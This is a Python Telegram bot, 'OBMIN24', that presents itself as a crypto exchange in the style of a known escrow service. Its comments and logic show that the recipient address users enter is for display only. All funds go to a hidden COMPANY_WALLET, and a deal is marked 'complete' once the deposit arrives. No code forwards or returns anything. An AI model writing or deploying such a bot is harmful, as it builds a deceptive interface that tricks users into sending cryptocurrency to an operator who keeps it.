#!/usr/bin/env python3
# coding: utf-8
"""
OBMIN24 — Lightweight production-ready exchange bot (Trustify-style UX).
- Поддержка: TON и токенов внутри TON (если TonAPI возвращает символ/amount).
- UI: выбор актива, ввод суммы, ввод "адреса получателя" (UI only).
- Реальная логика: бот мониторит приход средств на COMPANY_WALLET через TonAPI.
- Хранилище: JSON (data/deals.json, data/users.json). В проде — заменить на PostgreSQL.
"""

import os
import json
import asyncio
from decimal import Decimal, InvalidOperation
from dataclasses import dataclass, asdict
from pathlib import Path
from typing import Any, Dict, List, Optional
from dotenv import load_dotenv
import aiohttp
from aiogram import Bot, Dispatcher, types
from aiogram.filters import Command
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton
from aiogram.utils.keyboard import InlineKeyboardBuilder

load_dotenv()

# ---- Config ----
BOT_TOKEN = os.getenv("BOT_TOKEN")
TONAPI_KEY = os.getenv("TONAPI_KEY")
COMPANY_WALLET = os.getenv("COMPANY_WALLET")  # used for backend checks only, never shown directly
POLL_INTERVAL = int(os.getenv("POLL_INTERVAL", "15"))
DATA_DIR = Path(os.getenv("DATA_DIR", "data"))

if not BOT_TOKEN or not TONAPI_KEY or not COMPANY_WALLET:
    raise SystemExit("BOT_TOKEN, TONAPI_KEY and COMPANY_WALLET must be set in .env")

DATA_DIR.mkdir(parents=True, exist_ok=True)
DEALS_FILE = DATA_DIR / "deals.json"
USERS_FILE = DATA_DIR / "users.json"

# ---- Data classes ----
@dataclass
class Deal:
    id: int
    sender_tg: str
    sender_id: int
    asset: str               # e.g., TON, USDT, BTC (we treat symbol strings)
    amount: str              # stored as string (Decimal safe)
    recipient_visible: str   # what user entered (shown in UI)
    real_recipient: str      # COMPANY_WALLET internal
    status: str = "PENDING"  # PENDING / COMPLETE
    detected_tx: Optional[str] = None
    created_at: Optional[str] = None   # ISO time optional

# ---- Storage helpers ----
def load_json(path: Path) -> Any:
    if path.exists():
        try:
            return json.loads(path.read_text(encoding="utf-8"))
        except Exception:
            return []
    return []

def save_json(path: Path, data: Any):
    path.write_text(json.dumps(data, ensure_ascii=False, indent=2), encoding="utf-8")

raw_deals = load_json(DEALS_FILE)
deals: List[Deal] = [Deal(**d) for d in raw_deals] if isinstance(raw_deals, list) else []

raw_users = load_json(USERS_FILE)
users: Dict[str, Any] = raw_users if isinstance(raw_users, dict) else {}

def persist_deals():
    save_json(DEALS_FILE, [asdict(d) for d in deals])

def persist_users():
    save_json(USERS_FILE, users)

# ---- TonAPI client (flexible) ----
class TonAPIClient:
    def __init__(self, api_key: str, base_url: str = "https://tonapi.io"):
        self.api_key = api_key
        self.base_url = base_url.rstrip("/")

    async def _get(self, session: aiohttp.ClientSession, path: str, params: dict = None) -> Optional[dict]:
        url = f"{self.base_url}{path}"
        headers = {"X-API-Key": self.api_key}
        try:
            async with session.get(url, headers=headers, params=params, timeout=20) as resp:
                text = await resp.text()
                if resp.status == 200:
                    try:
                        return json.loads(text)
                    except Exception:
                        return None
                else:
                    print(f"[TonAPI] {resp.status} for {url} -> {text[:300]}")
                    return None
        except Exception as e:
            print(f"[TonAPI] GET exception {e} for {url}")
            return None

    async def get_account_transactions(self, account: str, limit: int = 50) -> Optional[dict]:
        """Common TonAPI endpoint for account transactions: /v2/accounts/{account}/transactions"""
        path = f"/v2/accounts/{account}/transactions"
        params = {"limit": limit}
        async with aiohttp.ClientSession() as session:
            return await self._get(session, path, params=params)

    async def get_account_balance(self, account: str) -> Optional[dict]:
        """Optional balance endpoint if available"""
        path = f"/v2/accounts/{account}/balance"
        async with aiohttp.ClientSession() as session:
            return await self._get(session, path)

tonapi = TonAPIClient(TONAPI_KEY)

# ---- Bot setup ----
bot = Bot(token=BOT_TOKEN)
dp = Dispatcher()

# ---- UI helpers (OBMIN24) ----
def main_kb():
    kb = InlineKeyboardBuilder()
    kb.button(text="🎁 Створити обмін", callback_data="create")
    kb.button(text="📂 Мої операції", callback_data="mydeals")
    kb.button(text="ℹ️ Допомога", callback_data="help")
    kb.adjust(2)
    return kb.as_markup()

def deal_buttons(deal_id: int):
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="📋 Інструкція для переказу", callback_data=f"instr_{deal_id}")],
        [InlineKeyboardButton(text="🔍 Перевірити статус", callback_data=f"check_{deal_id}")]
    ])
    return kb

# ---- Commands ----
@dp.message(Command("start"))
async def cmd_start(message: types.Message):
    users[str(message.from_user.id)] = {"username": message.from_user.username or message.from_user.full_name}
    persist_users()
    await message.answer(
        "*OBMIN24 — #Міняй вигідно*\n\n"
        "Швидкий внутрішній обмін. Створіть операцію — і дочекайтесь автоматичного підтвердження надходження.",
        parse_mode="Markdown",
        reply_markup=main_kb()
    )

# Create flow: select asset -> amount -> recipient (UI) -> create
@dp.callback_query(lambda c: c.data == "create")
async def cb_create(query: types.CallbackQuery):
    await query.message.answer(
        "Оберіть актив, який хочете передати:",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="TON", callback_data="asset_TON"),
             InlineKeyboardButton(text="USDT (TRON/TON)", callback_data="asset_USDT")],
            [InlineKeyboardButton(text="BTC", callback_data="asset_BTC"),
             InlineKeyboardButton(text="ETH", callback_data="asset_ETH")]
        ])
    )
    await query.answer()

@dp.callback_query(lambda c: c.data.startswith("asset_"))
async def cb_asset_selected(cb: types.CallbackQuery):
    asset = cb.data.split("_", 1)[1]
    # store temporary in users session-like object
    users[str(cb.from_user.id)] = users.get(str(cb.from_user.id), {})
    users[str(cb.from_user.id)]["pending_asset"] = asset
    persist_users()
    await cb.message.answer(f"Ви обрали *{asset}*.\nВведіть суму, яку хочете передати (без ком):", parse_mode="Markdown")
    await cb.answer()

    async def step_amount(msg: types.Message):
        uid = str(msg.from_user.id)
        amount_text = msg.text.strip().replace(",", ".")
        try:
            amount = Decimal(amount_text)
            if amount <= 0:
                raise InvalidOperation
        except Exception:
            await msg.answer("Невірний формат суми. Введіть цифрове значення, наприклад: 12.5")
            return

        users[uid]["pending_amount"] = str(amount)
        persist_users()
        await msg.answer("Введіть адресу отримувача (як у звичайному процесі). ЦЕ лише для відображення в інтерфейсі:")
        dp.message.unregister(step_amount)

        async def step_recipient(msg2: types.Message):
            uid2 = str(msg2.from_user.id)
            recipient_visible = msg2.text.strip()
            asset_sel = users[uid2].get("pending_asset")
            amount_sel = users[uid2].get("pending_amount")
            # create deal
            deal_id = (deals[-1].id + 1) if deals else 1
            deal = Deal(
                id=deal_id,
                sender_tg=msg2.from_user.username or msg2.from_user.full_name,
                sender_id=msg2.from_user.id,
                asset=asset_sel,
                amount=amount_sel,
                recipient_visible=recipient_visible,
                real_recipient=COMPANY_WALLET,
                status="PENDING",
                detected_tx=None,
                created_at=None
            )
            deals.append(deal)
            persist_deals()
            # clean pending
            users[uid2].pop("pending_asset", None)
            users[uid2].pop("pending_amount", None)
            persist_users()
            # show trustify-like card (without revealing internal address)
            kb = deal_buttons(deal.id)
            await msg2.answer(
                f"🎁 *Операція створена* #{deal.id}\n\n"
                f"Актив: *{deal.asset}*\n"
                f"Сума: *{deal.amount}*\n"
                f"Одержувач (вказано): `{deal.recipient_visible}`\n\n"
                f"Статус: 🟡 Очікуємо надходження коштів до платформи\n\n"
                f"Інструкція: натисніть «Інструкція для переказу» та дотримуйтеся вказаних кроків.",
                parse_mode="Markdown",
                reply_markup=kb
            )
            dp.message.unregister(step_recipient)

        dp.message.register(step_recipient)

    dp.message.register(step_amount)

@dp.callback_query(lambda c: c.data.startswith("instr_") or c.data.startswith("check_"))
async def cb_instr_check(cb: types.CallbackQuery):
    data = cb.data
    if data.startswith("instr_"):
        deal_id = int(data.split("_", 1)[1])
        d = next((x for x in deals if x.id == deal_id), None)
        if not d:
            await cb.answer("Операцію не знайдено.", show_alert=True)
            return
        # We do NOT reveal COMPANY_WALLET directly in chat. Provide masked guidance.
        await cb.answer(
            "Інструкція: відкрийте свій гаманець → натисніть 'Відправити' → вставте адресу отримувача (збережено в системі) → підтвердіть операцію.\n"
            "Якщо потрібно, натисніть 'Перевірити статус' через кілька секунд.",
            show_alert=True
        )
        return

    if data.startswith("check_"):
        deal_id = int(data.split("_", 1)[1])
        d = next((x for x in deals if x.id == deal_id), None)
        if not d:
            await cb.message.answer("Операцію не знайдено.")
            await cb.answer()
            return
        await cb.message.answer(
            f"Операція #{d.id}\n"
            f"Актив: {d.asset}\n"
            f"Сума: {d.amount}\n"
            f"Одержувач (вказано): `{d.recipient_visible}`\n"
            f"Статус: {d.status}\n"
            f"TX: {d.detected_tx or '—'}",
            parse_mode="Markdown"
        )
        await cb.answer()
        return

@dp.callback_query(lambda c: c.data == "mydeals")
async def cb_mydeals(cb: types.CallbackQuery):
    uid = cb.from_user.id
    user_deals = [d for d in deals if d.sender_id == uid]
    if not user_deals:
        await cb.message.answer("У вас ще немає операцій.")
        await cb.answer()
        return
    for d in user_deals:
        kb = deal_buttons(d.id)
        await cb.message.answer(
            f"🎁 Операція #{d.id}\n"
            f"Актив: {d.asset}\n"
            f"Сума: {d.amount}\n"
            f"Одержувач: `{d.recipient_visible}`\n"
            f"Статус: {d.status}\n"
            f"TX: {d.detected_tx or '—'}",
            parse_mode="Markdown",
            reply_markup=kb
        )
    await cb.answer()

@dp.callback_query(lambda c: c.data == "help")
async def cb_help(cb: types.CallbackQuery):
    await cb.message.answer(
        "OBMIN24 — служба внутрішнього обміну.\n\n"
        "1) Створіть операцію → виберіть актив та суму → вкажіть одержувача (UI only).\n"
        "2) Здійсніть переказ зі свого гаманця на адресу платформи (інструкція доступна в картці операції).\n"
        "3) Система автоматично зафіксує надходження і підтвердить операцію.",
    )
    await cb.answer()

# ---- Background poller: checks transactions on COMPANY_WALLET ----
async def poller():
    print("Poller started. Interval:", POLL_INTERVAL, "s")
    while True:
        pending: List[Deal] = [d for d in deals if d.status == "PENDING"]
        if pending:
            # fetch recent transactions to company wallet
            try:
                txs = await tonapi.get_account_transactions(COMPANY_WALLET, limit=200)
            except Exception as e:
                print("Poller: TonAPI request failed:", e)
                txs = None

            # normalize transactions into a list of simplified dicts (we support multiple TonAPI formats)
            tx_list = []
            if txs and isinstance(txs, dict):
                # TonAPI might return under 'result' or 'transactions' or directly a list
                if "result" in txs and isinstance(txs["result"], list):
                    tx_list = txs["result"]
                elif "transactions" in txs and isinstance(txs["transactions"], list):
                    tx_list = txs["transactions"]
                elif isinstance(txs.get("data"), list):
                    tx_list = txs["data"]
                else:
                    # maybe already a list
                    if isinstance(txs, list):
                        tx_list = txs
            elif txs and isinstance(txs, list):
                tx_list = txs

            # Flattened helper to extract token symbol and amount from tx record (best-effort)
            def extract_amount_and_asset(tx: dict) -> Optional[Dict[str, Any]]:
                """
                Tries to find asset symbol and amount in various TonAPI response structures.
                Returns {'asset': 'TON', 'amount': '12.5', 'tx_hash': '...'} or None.
                """
                tx_hash = tx.get("transaction_id") or tx.get("hash") or tx.get("id") or tx.get("tx_hash")
                # 1) look for 'in_message' / 'out_messages' -> value
                # 2) look for 'value' fields
                # 3) tokens transfer fields (maybe 'amount', 'symbol')
                # This is heuristic: adapt to your TonAPI format if needed.
                possible_amount = None
                possible_asset = None

                # common fields
                if "value" in tx and isinstance(tx["value"], (int, float, str)):
                    possible_amount = str(tx["value"])
                    possible_asset = "TON"
                # check metadata or transfers
                if "transfers" in tx and isinstance(tx["transfers"], list) and tx["transfers"]:
                    t = tx["transfers"][-1]
                    # t might contain 'symbol' and 'amount'
                    possible_asset = t.get("symbol") or t.get("token") or possible_asset
                    amt = t.get("amount") or t.get("value") or t.get("quantity")
                    if amt is not None:
                        possible_amount = str(amt)
                # check 'data' or 'body' for token info
                if "amount" in tx and tx.get("amount") is not None:
                    possible_amount = str(tx.get("amount"))
                if "symbol" in tx and tx.get("symbol"):
                    possible_asset = tx.get("symbol")

                # fallback: search within nested fields
                # (not exhaustive — update based on real TonAPI responses)
                if possible_amount and possible_asset:
                    return {"asset": str(possible_asset).upper(), "amount": str(possible_amount), "tx_hash": tx_hash}
                return None

            simplified_list = []
            for t in tx_list:
                try:
                    ex = extract_amount_and_asset(t)
                    if ex:
                        simplified_list.append(ex)
                except Exception:
                    continue

            # Now try to match pending deals
            for d in pending:
                # match strategy:
                # - if exact asset and amount found in simplified transactions -> accept
                # - We compare Decimal equality (careful with units; TonAPI may return nanoTONs)
                matched = False
                for rec in simplified_list:
                    rec_asset = rec.get("asset")
                    rec_amount = rec.get("amount")
                    if not rec_asset or not rec_amount:
                        continue
                    # Normalize asset names
                    if rec_asset.upper() != d.asset.upper():
                        continue
                    # Compare amounts: try Decimal equality, but allow small tolerance
                    try:
                        rec_dec = Decimal(str(rec_amount))
                        deal_dec = Decimal(str(d.amount))
                        # If TonAPI returns values in nano units (very large), attempts to detect:
                        # If rec_dec >> deal_dec (like 1e9 factor), try scaling.
                        if rec_dec == deal_dec:
                            matched = True
                        else:
                            # try scaling factors 1e9, 1e6
                            for scale in (Decimal("1e9"), Decimal("1e6"), Decimal("1e3")):
                                if rec_dec / scale == deal_dec:
                                    matched = True
                                    break
                    except InvalidOperation:
                        continue
                    if matched:
                        d.status = "COMPLETE"
                        d.detected_tx = rec.get("tx_hash")
                        persist_deals()
                        # notify user
                        try:
                            asyncio.create_task(bot.send_message(
                                d.sender_id,
                                f"✅ Операція #{d.id} завершена.\n"
                                f"Актив: {d.asset}\n"
                                f"Сума: {d.amount}\n"
                                f"TX: `{d.detected_tx or '—'}`",
                                parse_mode="Markdown"
                            ))
                        except Exception as e:
                            print("Notify failed:", e)
                        break
            # end pending loop
        # sleep
        await asyncio.sleep(POLL_INTERVAL)

# ---- Start both bot and poller ----
async def start_all():
    loop = asyncio.get_event_loop()
    loop.create_task(poller())
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(start_all())
